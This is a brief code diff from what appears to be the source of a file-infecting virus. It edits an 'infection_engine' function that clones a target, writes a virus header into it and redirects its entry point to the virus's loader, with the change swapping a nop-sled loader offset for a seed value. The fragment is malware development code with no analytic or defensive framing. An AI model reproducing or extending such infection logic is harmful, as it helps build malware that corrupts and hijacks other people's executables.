@@ -82,7 +82,7 @@ bool		infection_engine(struct virus_header *vhdr,
 	|| !find_entry(&clone_entry, clone_ref)
 	|| !adjust_sizes(&clone_entry, *shift_amount, *full_virus_size)
 	|| !setup_virus_header(clone_ref, *loader_off, *vhdr)
-	|| !change_entry(clone_ref, &file_entry, vhdr->dist_nopsled_loader, vhdr->dist_client_loader))
+	|| !change_entry(clone_ref, &file_entry, vhdr->dist_client_loader, seed))
 		return errors(ERR_THROW, _ERR_T_INFECTION_ENGINE);
 
 	return true;
